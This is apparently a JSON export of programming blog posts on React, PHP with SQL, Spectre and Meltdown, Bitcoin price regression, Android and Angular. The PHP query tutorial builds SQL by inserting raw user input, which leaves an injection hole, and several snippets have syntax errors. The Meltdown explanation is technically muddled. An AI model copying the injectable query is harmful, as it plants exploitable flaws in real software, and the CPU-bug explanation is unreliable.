&lt;div className=\"container\"&gt;\n &lt;a className=\"navbar-brand\" href=\"#\"&gt;Rate My Neighborhood&lt;/a&gt;\n &lt;button onClick={this.toggleNavbar} className={${classTwo}} type=\"button\" data-toggle=\"collapse\" data-target=\"#navbarResponsive\" aria-controls=\"navbarResponsive\" aria-expanded=\"false\" aria-label=\"Toggle navigation\"&gt;\n &lt;span className=\"navbar-toggler-icon\" /&gt;\n &lt;/button&gt;\n &lt;div className={${classOne}} id=\"navbarResponsive\"&gt;/pre\n\nKeep in mind that conditional rendering in ReactJS requires use of the a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/ConditionalOperator\" target=\"blank\" rel=\"noopener\"conditional (ternary) operator (the question mark)./a\n\n{{ ad }}\n\nFinally, I declare a function that changes the state of the collapsed boolean when the collapse button is clicked:\n\npretoggleNavbar() {\nthis.setState({\ncollapsed: !this.state.collapsed,\n});\n}/pre\n\nThat&#8217;s it! Now when you view the navbar on mobile and click on the collapse button, your navbar will appear as normal.\n\na href=\"https://github.com/DaveBben/bootstrap-navbar-collapse-reactjs\" target=\"_blank\" rel=\"noopener\"View the code on GitHub/a\n\n&nbsp;\n\n[1]: http://localhost/wordpress/wp-content/uploads/2017/12/navbar.png\n[2]: http://localhost/wordpress/wp-content/uploads/2017/12/rate-my-enighborhood.png\n",
        "tags": [
            "bootstrap",
            "collapse",
            "navbar",
            "reactjs"
        ]
    },
    {
        "uri": "/php-insert-sql-database-fetch-post/",
        "title": "PHP insert into SQL database from Fetch POST",
        "content": "\nAs a Javascript developer, I always prefer to use NodeJS as my API endpoint when interacting with a backend database. Unfortunately, it&#8217;s not always feasible to use NodeJS (especially in a shared hosting environment) and you might have to fall back to good old PHP. So here&#8217;s a quick refresher on how you can insert an object into an SQL database from javascript using php. If you haven&#8217;t already, check out my previous tutorial on making SQL queries from PHP using fetch API.\n\nFetch Post Method\n\nThe first thing that we need to do is create a fetch post request. However, whenever you do a post with PHP it usually expects the content type _to be _application/x-www-form-\\urlencoded. PHP is commonly used with HTML form submissions. Unfortunately, that&8217;s not what we are going to be doing. So we will need to encode our object keys and values into the proper format before making the request. Suppose I have the following Javascript object:\n\npremyobj = {name: \"Dave\"}/pre\n\nSo here&#8217;s what my request will look like:\n\npreconst person = Object.keys(myobj).map(key =&gt; ${encodeURIComponent(key)}=${encodeURIComponent(myobj[key])}).join('&');\nfetch('submit.php', {\nmethod: 'post',\nheaders: {\n'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',\n},\nbody: person,\n}).then((response) =&gt; {\n//do something if you want\n}).catch((data) =&gt; {\nconsole.log(data);\n});/pre\n\nNotice that I encoded the object (credit to a href=\"https://github.com/github/fetch/issues/263\" target=\"_blank\" rel=\"noopener\"this github issue/a). From there, I perform the usual POST request. Take note that I am using a relative path when calling my file, therefore it&#8217;s safe to assume that my front-end and back-end are being served on the same server with the same port.\n\n{{ ad }}\n\nDatabase Config\n\nThe first thing we want to do is create a file called *db_config.php. *All of our database configuration info will go in this file.\n\npre&lt;?php\n/*\nDatabase secret stuff....shhhh\n*/\n$servername = \"\";\n$username = \"\";\n$password = \"\";\n$dbname = \"\";\n$con = mysqli_connect(\"$servername\",\"$username\",\"$password\",\"$dbname\") or die (\"could not connect database\");\n?&gt;/pre\n\nThe only thing to note is that I am choosing to use the newer mysqli_connect api when connecting to the database.\n\n INSERT into SQL Database\n\nNow create a file called submit.php. Include the db_config.php file within that. We are then going to use the isset_ \\_ function to make sure that there&#8217;s a name field set in the POST keys. If not, we return a 400 response.\n\npre&lt;?php\ninclude \"db_config.php\";\n\nif(isset($_POST['name']))){\n$name=$_POST['name'];\n$sql = \"INSERT INTO people (name) VALUES (?)\";\n$stmt = $con-&gt;prepare($sql);\n$stmt-&gt;bind_param(\"s\", $name);\nif($stmt-&gt;execute()){\nhttpresponsecode(200);\ndie();\n}\nelse{\nhttpresponsecode(500);\ndie();\n}\n}\n}else{\nhttpresponsecode(400);\ndie();\n}\n\n?&gt;/pre\n\nWhen posting to a SQL database, you always want to use prepared statements. This is so that you can avoid SQL injection. The following lines take care of that:\n\npre$sql = \"INSERT INTO people (name) VALUES (?)\";\n$stmt = $con-&gt;prepare($sql);\n$stmt-&gt;bind_param(\"s\", $name);/pre\n\nI put a question mark for the value of name. If I had multiple values, I would use multiple question marks. Then for the binding command, I use *S* because the name parameter is a string. Again, if I had multiple values I would use multiple S&#8217;s or their corrsponding datatypes.\n\n{{ ad }}\n\nWhen you insert something into a SQL database, you don&#8217;t really get anything back. So how do you know if a php SQL insert was successful? That&#8217;s where the following line comes in:\n\npreif($stmt-&gt;execute()){\nhttpresponsecode(200);\ndie();\n}/pre\n\nIf the code fails to execute, the conditional will return false and we return a 500 response. Otherwise, we return a 200 response. That&#8217;s it!\n\n[1]: https://jsdeveloper.io/php-query-sql-database-return-json/\n",
        "tags": [
            "ajax",
            "fetch",
            "post",
            "sql"
        ]
    },
    {
        "uri": "/php-query-sql-database-return-json/",
        "title": "PHP Query SQL Database return JSON",
        "content": "\nAs a Javascript developer, I always prefer to use NodeJS as my API endpoint when interacting with a backend database. Unfortunately, it&#8217;s not always feasible to use NodeJS (especially in a shared hosting environment) and you might have to fall back to good old PHP. So here&#8217;s a quick refresher on how you can perform queries to a SQL database using PHP from an Ajax or Fetch call.\n\nFetch Call\n\nSuppose I have the following XMLhttp request using the fetch API:\n\nprefetch(getid.php?name=${name})\n .then(response =&gt; response.json())\n .then((json) =&gt; {\n console.log(json);\n })\n .catch((error) =&gt; {\n console.error(error);\n });/pre\n\nThis request calls the getname.php file with a query string of the name that we want to find. Take note that I am using a relative path when calling my file, therefore it&8217;s safe to assume that my front-end and back-end are being served on the same server with the same port.\n\n{{ ad }}\n\nDatabase Config\n\nThe first thing we want to do is create a file called *db_config.php. *All of our database configuration info will go in this file.\n\npre&lt;?php\n/*\nDatabase secret stuff....shhhh\n*/\n$servername = \"\";\n$username = \"\";\n$password = \"\";\n$dbname = \"\";\n$con = mysqli_connect(\"$servername\",\"$username\",\"$password\",\"$dbname\") or die (\"could not connect database\");\n?&gt;/pre\n\nThe only thing to note is that I am choosing to use the newer mysqli_connect api when connecting to the database.\n\n PHP SQL Query\n\nNow let&#8217;s query the database. Create a file called getid.php. The first thing that we need to do is include the db_config.php file. We are also going to initialize two arrays. The query_array will hold the separate query strings that we receive. The names array will hold the final ID&#8217;s that we received from each person in the database.\n\npre&lt;?php\n\ninclude \"db_config.php\";\n\n$query_array = [];\n$names = [];\n\nparsestr($SERVER[\"QUERYSTRING\"], $queryarray);\nif(isset($queryarray['name']) && $queryarray['name'] != null )\n{\n$name = $query_array['name'];\n$sql = \"SELECT id FROM people where name='$name'\";\n$result = $con-&gt;query($sql);\nif ($result-&gt;num_rows &gt; 0) {\n while($row = $result-&gt;fetch_assoc()) {\n  array_push($names,$row);\n }\n}\n$con-&gt;close();\nheader('Content-Type: application/json');\necho json_encode($names);\n}else{\n httpresponsecode(400);\n die();\n}\n\n?&gt;/pre\n\nWe use the parse_str **function to get any query strings and we save them to the **query_array (always save to the result array, never directly assign them to a variable). Recall that our fetch command grabs this script with a query string called name. Therefore, we will have an array with one key with the value name. We also check to make sure that the name value is defined and not null, otherwise, we return a 400 error (though this is not checking for an empty string).\n\n{{ ad }}\n\nFinally, it makes the SQL request and pushes all the resulting rows into our names array. We then close the connection and echo the json_encoded value of the names array as a response. So our response in javascript will look like:\n\n{&#8220;id&#8221;: &#8220;23453&#8221;}\n\nThat&#8217;s it!\n\n&nbsp;\n\n&nbsp;\n",
        "tags": [
            "fetch",
            "json",
            "php",
            "query",
            "sql"
        ]
    },
    {
        "uri": "/meltdown-and-spectre-javascript-vulnerabilities/",
        "title": "Meltdown and Spectre – Possible Javascript Vulnerabilities",
        "content": "\nThis has been a very interesting New Year. So far, 2018 has brought us two of the biggest bugs to hit CPUs in the past 12 years: Meltdown and Spectre. Intel is struggling to get their Meltdown bug under control while Amazon and Microsoft brutally await its impact on their cloud services. Both Meltdown and Spectre are serious issues, but Meltdown is easier to exploit and gives attackers more valuable information. Also, Meltdown is only a vulnerability for Intel CPUs while Spectre affects all CPUs. Another interesting thing to note is that Spectre could be exposed through Javascript (or any other JIT compiler) while Meltdown can be exposed by almost any locally installed software.\n\nSpeculative Execution:\n\nMeltdown and Spectre are results of this interesting mechanism of speculative execution. Speculative execution is an optimization technique that practically every CPU uses to save resources and increase performance output and efficiency. Speculative execution is mostly used to reduce the cost of conditional statements. For example, say I have the following:\n\npreif(x &gt; y){\n\nx = z;\n\n}/pre\n\nWith speculative execution, the CPU will execute this conditional even before its determined whether the conditional is true. In other words, before we even check if X is truly greater than Y, we will execute this statement and hold onto the results. If indeed it is true, then great, we just saved time. Otherwise, we disregard the results.\n\nIt&8217;s import to point out that the CPU only does this pre-execution if it has strong reason to believe that X will be greater than Y. Therefore, if at other points in the program we compared X to Y or similar values and it was true, then we (as the CPU) can safely assume that it will be true later on.\n\n{{ ad }}\n\nSpectre Javascript Vulnerability:\n\nAs I mentioned earlier, Spectre could be exposed through Javascript or any other JIT compiled languaged. However, please don&8217;t freak out and start disabling Javascript as some other clickbait news articles have suggested. For one, your browsing experience on most websites will be terrible if not impractical without Javascript. Secondly, the Spectre javascript vulnerability is very complicated to actually pull off.\n\nHere is some sample code from a a href=\"https://spectreattack.com/spectre.pdf\" target=\"_blank\" rel=\"noopener\"well-explained research paper/a of the vulnerability.\n\npreif (x &lt; array1_size)\n y = array2[array1[x] * 256];/pre\n\nSuppose that X is some malicious value that resolves to a memory address K, and also suppose that you have flushed the CPU Cache and that array1.size and array2 are not in memory but K is. Finally, you will need the CPU to perform its speculative operation so that it thinks x will likely be less than array1_size. This could be accomplished by running X in some loop and changing the value on its last iteration.\n\nThe result is that you can now read that address K. Now keep in mind, your program will already need to have the privilege to read that address anyway (unlike the Meltdown bug) so if we are talking about Javascript in a web browser, you are essentially bypassing Chrome&#8217;s sandbox and getting access to other memory in Chrome.\n\nAgain, this is not impossible to do but it&#8217;s not a simple copy and paste script. As described in the article, it was necessary to compile the JS to machine code and manipulate a couple of things to get the desired result.\n\npreif (index &lt; simpleByteArray.length) {\nindex = simpleByteArray[index | 0];\nindex = (((index * TABLE1STRIDE)|0) & (TABLE1BYTES-1))|0;\nlocalJunk ^= probeTable[index|0]|0;\n}/pre\n\nThe above lines are the full program with constants defined in their article. The following is the generated machine code with the changes to get the necessary values loaded into memory.\n\npre1 cmpl r15,[rbp-0xe0] ; Compare index (r15) against simpleByteArray.length\n2 jnc 0x24dd099bb870 ; If index &gt;= length, branch to instruction after movq below\n3 REX.W leaq rsi,[r12+rdx*1] ; Set rsi=r12+rdx=addr of first byte in simpleByteArray\n4 movzxbl rsi,[rsi+r15*1] ; Read byte from address rsi+r15 (= base address+index)\n5 shll rsi, 12 ; Multiply rsi by 4096 by shifting left 12 bits}\\%\\\n6 andl rsi,0x1ffffff ; AND reassures JIT that next operation is in-bounds\n7 movzxbl rsi,[rsi+r8*1] ; Read from probeTable\n8 xorl rsi,rdi ; XOR the read result onto localJunk\n9 REX.W movq rdi,rsi ; Copy localJunk into rdi/pre\n\nMeltdown\n\nSo this is the big one that kicked it all off. Meltdown is also a result of speculative execution but comes from a trivial abuse in the system. Let&8217;s refer back to the same conditional as above:\n\npreif(x &gt; y){\n\nx = z;\n\n}/pre\n\nNow suppose this conditional execute, on an Intel CPU this could be very bad. Let&#8217;s say the line x = z is actually access to the special L1 D-cache that contains privilege data like cryptographic keys. Since this data is privileged, it&#8217;s only accessible to programs running in the Kernel space. But wait, we just trigged the CPU into thinking that we are most likely a privilege program and therefore it just takes a few extra steps to get access to this data. This is very important when the OS is context switching and working with memory between programs that should not be shared or accessible by other programs.\n\nThis vulnerability does not exist on AMD CPUs because they check the security flags upon processes accessing the cache. Albeit a slower but more secure option.\n\n&nbsp;\n",
        "tags": [
            "javascript",
            "meltdown",
            "spectre"
        ]
    },
    {
        "uri": "/use-machine-learning-to-predict-the-value-of-bitcoin/",
        "title": "Use Machine Learning to Predict the Value of Bitcoin",
        "content": "\nThe day has finally come at which I can use machine learning and bitcoin in the same article. The only thing that would impress me more would be relating the topics of machine learning, bitcoin, and blockchain in the same article, but I digress. Anway, the value of bitcoin is astonishing. It went from  $900 to well over $14,000 in less than 6 months time! So hey, let&#8217;s start riding this bubble and try to cash in before its too late. Therefore, we can use machine learning to predict the value of bitcoin in the future.\n\nMachine Learning and Bitcoin\n\nBefore you get started, let&8217;s establish a couple of things. First, it&#8217;s nearly impossible to accurately predict the value of a stock (and cryptocurrency) with a simple computer algorithm. This is because there are so many factors that can affect the price of a stock that we cannot account for. Think about this, for almost no apparent reason, the price of bitcoin rises and surges. There is no mathematical variable or equation that we can use to predict these rises and falls. Yes, there are some really advanced computer models for stocks which takes into account many long-term factors, but nothing is going to give you 100% accuracy.\n\nNow when it comes to machine learning, we are going to keep it slightly old school. We are going to use linear regression to predict the value of bitcoin. Linear regression is perhaps the oldest method of &#8220;machine learning&#8221; but it&#8217;s also the easiest to comprehend.\n\n{{ ad }}\n\nLinear Regression\n\nThe most classic linear regression example is predicting the price of a house. Say we have the following information about the house:\n\nNumber of Rooms\nPrice\n\nIn this example, we would want to predict the target value (price) of the function. Now the only feature we have are the number of rooms (independent variable). If we plot number of rooms vs price we will notice a positive correlation. As the number of rooms increases so does the price of the house. Therefore, we can use a simple linear regression algorithm to predict the price of a house using X number of rooms. This can also be found by simply drawing the line of best fit.\n\n Recurrent Neural Network\n\nAnother alternative in using machine learning to predict the value of bitcoin is to use recurrent neural networks with long short term memory (LSTM). Essentially, recurrent neural networks are like normal neural networks except that they &#8220;remember&#8221; past data. The outputs and inputs are feed in such a way that it creates &#8220;memory&#8221; for the network. This is ideal for working with time series data, such as the price of stocks or value of bitcoin. Unfortunately, implementing a recurrent neural network isn&#8217;t as straightforward as implementing linear regression. We will leave that as a future topic to this project.\n\nPython\n\nSo let&8217;s get start using machine learning to predict the value of bitcoin. I am going to use python with its Sklearn library to help us out. I uploaded a a href=\"https://gist.github.com/DaveBben/4785fb25d1079f661219e35aa7138bb5\" target=\"blank\" rel=\"noopener\"CSV/a and a href=\"https://gist.github.com/DaveBben/76dc4746ca00ad77292e7206fafa2b35\" target=\"blank\" rel=\"noopener\"JSON/a file of the daily bitcoin prices from April 2013 to January 2018. You can use whichever you like, but for this example, I am going to use the CSV file. Below is my python program:\n\npreimport csv\nimport numpy as np\nfrom sklearn.svm import SVR\nfrom sklearn import linear_model\nimport matplotlib.pyplot as plt\n\ndates = []\nprices = []\n\ndef get_data(filename):\nwith open(filename,'r') as csvfile:\ncsvFileReader = csv.reader(csvfile)\nnext(csvFileReader) #skipping column names\nfor row in csvFileReader:\ndates.append(int(row[0]))\nprices.append(float(row[5]))\n\nreturn\n\ndef show_plot(dates,prices,x):\nlinearmod = linearmodel.LinearRegression()\ndates = np.reshape(dates,(len(dates),1)) # converting to matrix of n X 1\nprices = np.reshape(prices,(len(prices),1))\nlinear_mod.fit(dates,prices) #fitting the data points in the model\nplt.scatter(dates,prices,color='black') #plotting the initial datapoints\nplt.plot(dates,linear_mod.predict(dates),color='blue',linewidth=3) #plotting the line made by linear regression\nplt.show()\npredictedprice =linearmod.predict(x)\nreturn predicted_price\n\ngetdata('price.csv') # calling getdata method by passing the csv file to it\n\nprices.reverse();\n\npredictedprice = showplot(dates,prices,1715)\n\nprint \"The predicted price is: $\",str(predicted_price)/pre\n\nThe above program is not perfect (sorry I am a JS developer), but it gets the job done.\n\nThe Predicted Value of Bitcoin\n\nIf you run the python program, you will notice that it predicts the value of bitcoin to be \\$3,418 the next day. Clearly, this is very inaccurate. So what went wrong? Well let&8217;s look at the graph:\n\nSee, until recently, bitcoin has a steady increase in price. Therefore, its value could fit into a simple linear model. However, bitcoin has a huge spike at the end of last year which caused its value to grow almost exponentially. So while we could try to fit the data into a more accurate linear model, it will still not be ideal because bitcoin&#8217;s growth has exploded.\n\n{{ ad }}\n\nPolynomial Regression\n\nSo we established that a linear model wouldn&8217;t be the most accurate representation for the value of bitcoin. So let&#8217;s try to use a Polynomial regression instead. To keep things simple, I decided to code this one in javascript using the same data:\n\npreconst regression = require('regression');\nconst bPrices = require('./BitcoinPrice');\n\nconst x = [];\nconst y = [];\n\nconst data = [];\nlet j = 0;\nfor (let i = bPrices.length - 1; i &gt;= 0; i--) {\ndata.push([j, bPrices[i].Close]);\nj++;\n}\nconst result = regression.polynomial(data,{ order: 2 });\nconsole.log(result.predict(1715));/pre\n\nIf you run this program in NodeJS, you will notice that the output is $18,592. The current value of bitcoin is around $16k. Again, this is not very accurate but it&#8217;s a lot closer to the actual value compared to the linear regression.\n\nConclusion\n\ntl;dr It&8217;s very hard to predict the value of stocks and cryptocurrency. Using a linear model works if the increase is steady. Unfortunately (or not), Bitcoin&#8217;s value spiked exponentially. Therefore, we have to resort to a second degree polynomial to get a better prediction. Also, without any finite independent variables for correlation, there is only so much we can do to try to model the data using regression. In the end, a look into using recurrent neural networks would be the best approach.\n\n&nbsp;\n\n[1]: http://localhost/wordpress/wp-content/uploads/2018/01/cor9.png\n[2]: http://localhost/wordpress/wp-content/uploads/2018/01/graph.png\n[3]: http://localhost/wordpress/wp-content/uploads/2018/01/graph-1.png\n",
        "tags": [
            "python"
        ]
    },
    {
        "uri": "/android-recyclerview-for-installed-apps-with-checkbox/",
        "title": "Android Recyclerview for Installed Apps with Checkbox",
        "content": "\nOne of the most common reasons that you would want to use the android recyclerview is if you want to show a list of some sort. In this example, let&#8217;s take a look at how you can use the android recyclerview to show a list of installed apps on your device. Within each item, we will also include a checkbox. Here&#8217;s what it will look like:\n\nLayout\n\nLet&8217;s first take care of creating the layout files. Here is my layout file for the main activity (activity_main.xml). I am using a FrameLayout, with the Recyclerview **and **F\\*\\loating Action Button.\\\\* The floating action button is not necessary for this tutorial.\n\npre&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n\n&lt;FrameLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    android:layoutwidth=\"matchparent\"\n    android:layoutheight=\"matchparent\"&gt;\n\n    &lt;android.support.v7.widget.RecyclerView\n        android:id=\"@+id/recycleView\"\n        android:layoutwidth=\"matchparent\"\n        android:layoutheight=\"matchparent\"\n        tools:layouteditorabsoluteX=\"8dp\"\n        tools:layouteditorabsoluteY=\"8dp\" /&gt;\n\n    &lt;android.support.design.widget.FloatingActionButton\n        android:id=\"@+id/sharebutton\"\n        android:layoutwidth=\"wrapcontent\"\n        android:layoutheight=\"wrapcontent\"\n        android:layout_gravity=\"end|bottom\"\n        android:layout_margin=\"16dp\"\n        android:clickable=\"true\"\n        app:elevation=\"6dp\"\n        app:fabSize=\"normal\"\n\n        app:srcCompat=\"@android:drawable/icmenushare\" /&gt;\n\n&lt;/FrameLayout&gt;/pre\n\nNext, let&#8217;s take care of the layout for each individual item in the list. I am calling this main_line_view.xml. It contains the following contents:\n\npre&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n\n&lt;RelativeLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    android:id=\"@+id/item\"\n    android:layoutwidth=\"matchparent\"\n    android:layoutheight=\"wrapcontent\"&gt;\n\n    &lt;LinearLayout\n        android:layoutwidth=\"fillparent\"\n        android:layoutheight=\"wrapcontent\"\n        android:orientation=\"horizontal\"&gt;\n\n        &lt;RelativeLayout\n            android:layoutwidth=\"fillparent\"\n            android:layoutheight=\"wrapcontent\"\n            android:padding=\"8dp\"&gt;\n\n            &lt;ImageView\n                android:id=\"@+id/packageImage\"\n                android:layout_width=\"50dp\"\n                android:layout_height=\"50dp\"\n                android:layout_marginRight=\"5dp\"\n                android:layout_marginTop=\"6dp\"\n                android:src=\"@mipmap/ic_launcher\" /&gt;\n\n            &lt;TextView\n                android:id=\"@+id/Apk_Name\"\n                android:layoutwidth=\"wrapcontent\"\n                android:layoutheight=\"wrapcontent\"\n                android:layout_marginLeft=\"4dp\"\n                android:layout_marginTop=\"6dp\"\n                android:layout_toEndOf=\"@id/packageImage\"\n                android:layout_toRightOf=\"@id/packageImage\"\n                android:textColor=\"#000\" /&gt;\n\n            &lt;TextView\n                android:id=\"@+id/ApkPackageName\"\n                android:layoutwidth=\"wrapcontent\"\n                android:layoutheight=\"wrapcontent\"\n                android:layoutbelow=\"@id/ApkName\"\n                android:layout_marginLeft=\"4dp\"\n                android:layout_toEndOf=\"@id/packageImage\"\n                android:layout_toRightOf=\"@id/packageImage\"\n                android:textColor=\"#795548\"\n\n                /&gt;\n\n            &lt;CheckBox\n                android:id=\"@+id/appSelect\"\n                android:layoutwidth=\"wrapcontent\"\n                android:layoutheight=\"wrapcontent\"\n                android:layout_alignParentEnd=\"true\"\n                android:layout_centerVertical=\"true\" /&gt;\n        &lt;/RelativeLayout&gt;\n\n    &lt;/LinearLayout&gt;\n\n&lt;/RelativeLayout&gt;/pre\n\n{{ ad }}\n\nBuild Grade\n\nIn your build Gradle (of the module: App), make sure that you include the following:\n\npreimplementation 'com.android.support:recyclerview-v7:26.1.0'\nimplementation 'com.android.support:design:26.1.0'/pre\n\nUpdate the version to match the SDK that you are targeting.\n\n Viewing Installed Apps\n\nNow let&#8217;s work on getting the list of apps installed on your device. The only important line of code that you will need is the following:\n\npreList&lt;ApplicationInfo&gt; packages = mContext.getPackageManager().getInstalledApplications(0);/pre\n\nHowever, I also want to grab app name and icon. To keep things easy and re-usable, I created a class called AppManager and added the following contents:\n\nprepublic class AppsManager {\n    private Context mContext;\n    private AppInfo appInfo;\n    private ArrayList&lt;AppInfo&gt; myApps;\n\n    public AppsManager(Context c) {\n        mContext = c;\n        myApps = new ArrayList&lt;AppInfo&gt;();\n    }\n\n    public ArrayList&lt;AppInfo&gt; getApps() {\n        loadApps();\n        return myApps;\n    }\n\n    private void loadApps() {\n\n        List&lt;ApplicationInfo&gt; packages = mContext.getPackageManager().getInstalledApplications(0);\n        for (ApplicationInfo packageInfo : packages) {\n            AppInfo newApp = new AppInfo();\n            newApp.setAppName(getApplicationLabelByPackageName(packageInfo.packageName));\n            newApp.setAppPackage(packageInfo.packageName);\n            newApp.setAppIcon(getAppIconByPackageName(packageInfo.packageName));\n            myApps.add(newApp);\n        }\n\n        Collections.sort(myApps, new Comparator&lt;AppInfo&gt;() {\n            @Override\n            public int compare(AppInfo s1, AppInfo s2) {\n                return s1.getAppName().compareToIgnoreCase(s2.getAppName());\n\n            }\n        });\n\n    }\n\n    // Custom method to get application icon by package name\n    private Drawable getAppIconByPackageName(String packageName) {\n        Drawable icon;\n        try {\n            icon = mContext.getPackageManager().getApplicationIcon(packageName);\n        } catch (PackageManager.NameNotFoundException e) {\n            e.printStackTrace();\n            // Get a default icon\n            icon = ContextCompat.getDrawable(mContext, R.drawable.iclauncherbackground);\n        }\n        return icon;\n    }\n\n    // Custom method to get application label by package name\n    private String getApplicationLabelByPackageName(String packageName) {\n        PackageManager packageManager = mContext.getPackageManager();\n        ApplicationInfo applicationInfo;\n        String label = \"Unknown\";\n        try {\n            applicationInfo = packageManager.getApplicationInfo(packageName, 0);\n            if (applicationInfo != null) {\n                label = (String) packageManager.getApplicationLabel(applicationInfo);\n            }\n\n        } catch (PackageManager.NameNotFoundException e) {\n            e.printStackTrace();\n        }\n        return label;\n    }\n}/pre\n\nThe first function called loadApps gets the list of installed applications on the device. You will notice that I created my own custom class called AppInfo. This is because I wanted to store particular values and info from each class. Here is what the class AppInfo looks like:\n\nprepublic class AppInfo {\n    private String appName;\n    private String appPackage;\n    private Drawable appIcon;\n    private boolean isSelected;\n\n    public String getAppPackage() {\n        return appPackage;\n    }\n\n    public void setAppPackage(String appPackage) {\n        this.appPackage = appPackage;\n    }\n\n    public Drawable getAppIcon() {\n        return appIcon;\n    }\n\n    public void setAppIcon(Drawable appIcon) {\n        this.appIcon = appIcon;\n    }\n\n    public boolean isSelected() {\n        return isSelected;\n    }\n\n    public void setSelected(boolean selected) {\n        isSelected = selected;\n    }\n\n    public String getAppName() {\n        return appName;\n    }\n\n    public void setAppName(String appName) {\n        this.appName = appName;\n    }\n}/pre\n\nSo loadApps essentially saves a list of type AppInfo. I also implement a custom sort method that will sort the apps by their app name. You can then grab the list using the getApps method.\n\n{{ ad }}\n\nView Adapter\n\nNow it&8217;s time to implement a view adapter. If you worked with listviews in the pass, then this will look very familiar. Essentially, a view adapter controls how the recyclerview will show the view. It also maps all of our items from the mainlineview.xml to functions in the adapter. So here&#8217;s what the adapter looks like:\n\nprepublic class InstalledAppsAdapter extends RecyclerView.Adapter&lt;InstalledAppsAdapter.ViewHolder&gt; {\n\n    private Context mContext;\n    private ArrayList&lt;AppInfo&gt; mDataSet;\n\n    public InstalledAppsAdapter(Context context, ArrayList&lt;AppInfo&gt; list) {\n        mContext = context;\n        mDataSet = list;\n    }\n\n    public static class ViewHolder extends RecyclerView.ViewHolder {\n\n        public TextView mTextViewLabel;\n        public TextView mTextViewPackage;\n        public ImageView mImageViewIcon;\n        public CheckBox mAppSelect;\n        public RelativeLayout mItem;\n\n        public ViewHolder(View v) {\n            super(v);\n            // Get the widgets reference from custom layout\n            mTextViewLabel = (TextView) v.findViewById(R.id.Apk_Name);\n            mTextViewPackage = (TextView) v.findViewById(R.id.ApkPackageName);\n            mImageViewIcon = (ImageView) v.findViewById(R.id.packageImage);\n            mAppSelect = (CheckBox) v.findViewById(R.id.appSelect);\n            mItem = (RelativeLayout) v.findViewById(R.id.item);\n        }\n\n    }\n\n    @Override\n    public InstalledAppsAdapter.ViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {\n        View v = LayoutInflater.from(mContext).inflate(R.layout.mainlineview, parent, false);\n        ViewHolder vh = new ViewHolder(v);\n        return vh;\n    }\n\n    @Override\n    public void onBindViewHolder(ViewHolder holder, final int position) {\n\n        // Get the current package name\n        final String packageName = mDataSet.get(position).getAppPackage();\n\n        // Get the current app icon\n        Drawable icon = mDataSet.get(position).getAppIcon();\n\n        // Get the current app label\n        String label = mDataSet.get(position).getAppName();\n\n        // Set the current app label\n        holder.mTextViewLabel.setText(label);\n\n        // Set the current app package name\n        holder.mTextViewPackage.setText(packageName);\n\n        // Set the current app icon\n        holder.mImageViewIcon.setImageDrawable(icon);\n\n        holder.mAppSelect.setChecked(mDataSet.get(position).isSelected());\n\n        holder.mItem.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                mDataSet.get(position).setSelected(!mDataSet.get(position).isSelected());\n                InstalledAppsAdapter.this.notifyDataSetChanged();\n            }\n        });\n\n    }\n\n    @Override\n    public int getItemCount() {\n        // Count the installed apps\n        return mDataSet.size();\n    }\n\n}/pre\n\nThe only thing I want to point out if how I am handling the checkbox click. You will see the I implemented a listener that wraps the entire item. When it&#8217;s clicked, I set the selected boolean to the opposite of what it was. Finally, I used the line notifyDataSetChanged so that the recyclerview will refresh the list.\n\nMain Activity\n\nFinally, we can finish it up in our main activity by using the following lines:\n\nprepublic class MainActivity extends AppCompatActivity {\n\n    private RelativeLayout mRelativeLayout;\n\n    private RecyclerView mRecyclerView;\n    private RecyclerView.LayoutManager mLayoutManager;\n    private RecyclerView.Adapter mAdapter;\n    private ArrayList&lt;AppInfo&gt; installedApps;\n    private FloatingActionButton shareButton;\n    private AppsManager appManager;\n    private final String baseURL = \"http://192.168.50.48/post.php\";\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        installedApps = new ArrayList&lt;AppInfo&gt;();\n        mRecyclerView = (RecyclerView) findViewById(R.id.recycleView);\n        shareButton = (FloatingActionButton) findViewById(R.id.sharebutton);\n        LinearLayoutManager layoutManager = new LinearLayoutManager(this);\n        mRecyclerView.setLayoutManager(layoutManager);\n        appManager = new AppsManager(this);\n        installedApps = appManager.getApps();\n\n        // Initialize a new adapter for RecyclerView\n        mAdapter = new InstalledAppsAdapter(\n                getApplicationContext(),\n                installedApps\n        );\n\n        mRecyclerView.setAdapter(mAdapter);\n      \n    }\n}/pre\n\nThat&8217;s it! You can now have an android app that will display a list of installed apps using the recyclerview with a checkbox next to each item.\n\n[1]: http://localhost/wordpress/wp-content/uploads/2018/01/Screenshot_1515419105.png\n",
        "tags": [
            "android development",
            "java",
            "recyclerview"
        ]
    },
    {
        "uri": "/angular-4-forms-2/",
        "title": "Angular 4 Forms",
        "content": "\nOne of my favorite features in Angular are forms. Using Angular 4 forms or Angular 5 forms are very helpful because they provide for quick validation and object mapping. Here&#8217;s how you can create a basic angular 4 form (also works with angular 2, and angular 5).\n\nHTML\n\nYou will also notice that I am using Bootstrap for some styling, that is completely optional. Let&8217;s look at the form HTML:\n\npre&lt;form #myForm=\"ngForm\" #form class=\" animated fadeIn\"&gt;\n &lt;div class=\"form-group\"&gt;\n &lt;label for=\"exampleInputEmail1\"&gt;First Name&lt;/label&gt;\n &lt;input type=\"email\" class=\"form-control\" aria-describedby=\"emailHelp\" name=\"firstName\" [(ngModel)]=\"student.firstName\" #firstName=\"ngModel\" required &gt;\n &lt;!-- &lt;small id=\"emailHelp\" class=\"form-text text-muted\"&gt;We'll never share your email with anyone else.&lt;/small&gt; --&gt;\n &lt;div *ngIf=\"firstName.errors && (firstName.dirty || firstName.touched)\" class=\"alert alert-danger\"&gt;\n &lt;div [hidden]=\"!firstName.errors.required\"&gt;\n Field is required!\n &lt;/div&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n &lt;div class=\"form-group\"&gt;\n &lt;label for=\"exampleInputPassword1\"&gt;Last Name&lt;/label&gt;\n &lt;input type=\"text\" class=\"form-control\" name=\"lastName\" 